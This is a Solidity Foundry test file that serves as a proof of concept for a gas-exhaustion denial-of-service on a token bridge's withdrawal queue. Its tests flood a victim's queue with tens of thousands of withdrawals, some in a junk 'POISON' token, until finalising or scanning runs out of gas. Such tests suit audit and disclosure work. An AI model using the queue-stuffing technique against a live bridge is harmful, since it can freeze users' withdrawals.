// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

// solhint-disable private-vars-leading-underscore

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {RootERC20BridgeFlowRate} from "src/root/flowrate/RootERC20BridgeFlowRate.sol";
import {IRootERC20Bridge} from "src/interfaces/root/IRootERC20Bridge.sol";
import {IRootBridgeAdaptor} from "src/interfaces/root/IRootBridgeAdaptor.sol";
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

// -----------------------------------------------------------------------------
// Minimal token mocks
// -----------------------------------------------------------------------------

contract LegitimateToken is ERC20 {
    constructor() ERC20("Legitimate Token", "LEGIT") {
        _mint(msg.sender, 1e30);
    }
}

contract AttackerToken is ERC20 {
    constructor() ERC20("Poison Token", "POISON") {
        _mint(msg.sender, 1e30);
    }
}

contract ImxTokenMock is ERC20 {
    constructor() ERC20("Immutable X", "IMX") {
        _mint(msg.sender, 1e30);
    }
}

contract MockBridgeAdaptor is IRootBridgeAdaptor {
    event Sent(bytes payload, address sender, uint256 value);

    function sendMessage(
        bytes calldata payload,
        address refundRecipient
    ) external payable override {
        emit Sent(payload, refundRecipient, msg.value);
    }

    receive() external payable {}
}

// -----------------------------------------------------------------------------
// Vulnerable withdrawal queue tests - expected to FAIL on vulnerable contract
// -----------------------------------------------------------------------------

contract QueueBombVulnerableTest is Test {
    RootERC20BridgeFlowRate internal bridge;
    LegitimateToken internal legit;
    AttackerToken internal poison;
    ImxTokenMock internal imx;
    MockBridgeAdaptor internal rootBridgeAdaptor;

    address constant CHILD_BRIDGE = address(0xBEEF);
    address constant CHILD_BRIDGE_ADAPTOR_TEMPLATE = address(0xCAFE);
    address constant WETH_TOKEN = address(0xDEAD);

    address internal initializer = address(this);
    address internal rateAdmin = address(this);

    address internal receiver = address(0xA11CE);
    address internal victim = address(0xB00B);

    function setUp() public {
        legit = new LegitimateToken();
        poison = new AttackerToken();
        imx = new ImxTokenMock();
        rootBridgeAdaptor = new MockBridgeAdaptor();

        bridge = new RootERC20BridgeFlowRate(initializer);

        IRootERC20Bridge.InitializationRoles memory roles = IRootERC20Bridge
            .InitializationRoles({
                defaultAdmin: address(this),
                pauser: address(this),
                unpauser: address(this),
                variableManager: address(this),
                adaptorManager: address(this)
            });

        bridge.initialize(
            roles,
            address(rootBridgeAdaptor),
            CHILD_BRIDGE,
            CHILD_BRIDGE_ADAPTOR_TEMPLATE,
            address(imx),
            WETH_TOKEN,
            type(uint256).max,
            rateAdmin
        );

        bridge.mapToken{value: 1 ether}(legit);
        bridge.mapToken{value: 1 ether}(poison);

        legit.transfer(address(bridge), 2_000 ether);

        bridge.activateWithdrawalQueue();
    }

    function _stuffQueue(
        address forReceiver,
        address token,
        uint256 count,
        uint256 amount
    ) internal {
        bytes32 withdrawSig = bridge.WITHDRAW_SIG();
        for (uint256 i = 0; i < count; i++) {
            bytes memory payload = abi.encode(
                withdrawSig,
                token,
                address(this),
                forReceiver,
                amount
            );
            vm.prank(address(rootBridgeAdaptor));
            bridge.onMessageReceive(payload);
        }
    }

    // Sanity test (passes)
    function testSmallAggregationSucceeds() public {
        console.log("[VULN] testSmallAggregationSucceeds start");
        _stuffQueue(receiver, address(legit), 10, 1 ether);
        console.log("Queue stuffed with 10 LEGIT withdrawals");
        vm.warp(block.timestamp + 2 days);
        console.log("Warped 2 days, aggregating");
        uint256[] memory idx = new uint256[](10);
        for (uint256 i = 0; i < 10; i++) idx[i] = i;
        bridge.finaliseQueuedWithdrawalsAggregated(
            receiver,
            address(legit),
            idx
        );
        console.log("Aggregation succeeded (sanity)\n");
    }

    // DoS aggregation - expected to revert/OOG -> test fails (assertTrue)
    function testQueueBombDoS() public {
        console.log("[VULN] testQueueBombDoS start");
        uint256 big = 45_000;
        console.log("Stuffing queue with", big, "LEGIT withdrawals");
        _stuffQueue(receiver, address(legit), big, 1 ether);
        vm.warp(block.timestamp + 2 days);
        console.log("Warped 2 days, attempting aggregation with 25M gas");
        uint256[] memory idx = new uint256[](big);
        for (uint256 i = 0; i < big; i++) idx[i] = i;
        (bool ok, ) = address(bridge).call{gas: 25_000_000}(
            abi.encodeWithSelector(
                bridge.finaliseQueuedWithdrawalsAggregated.selector,
                receiver,
                address(legit),
                idx
            )
        );
        console.log("Aggregation call returned", ok);
        assertTrue(
            ok,
            "Vulnerable contract should OOG - test will fail (as intended)"
        );
        console.log("Unexpected success - vulnerability fixed?\n");
    }

    // DoS scan poisoning - expected to revert/OOG -> test fails (assertTrue)
    function testQueuePoisoningWithJunkTokenAttack() public {
        console.log("[VULN] testQueuePoisoningWithJunkTokenAttack start");
        _stuffQueue(victim, address(legit), 1, 1 ether);
        console.log("Victim queued 1 LEGIT withdrawal");
        uint256 poisonCount = 45_000;
        console.log("Attacker stuffing", poisonCount, "POISON withdrawals");
        _stuffQueue(victim, address(poison), poisonCount, 1 wei);
        vm.warp(block.timestamp + 2 days);
        console.log("Warped 2 days, scanning queue with 25M gas");
        uint256 stop = poisonCount + 1;
        (bool ok, ) = address(bridge).call{gas: 25_000_000}(
            abi.encodeWithSelector(
                bridge.findPendingWithdrawals.selector,
                victim,
                address(legit),
                0,
                stop,
                10
            )
        );
        console.log("findPendingWithdrawals returned", ok);
        assertTrue(
            ok,
            "Vulnerable contract should OOG - test will fail (as intended)"
        );
        console.log("Unexpected success - vulnerability fixed?\n");
    }
}
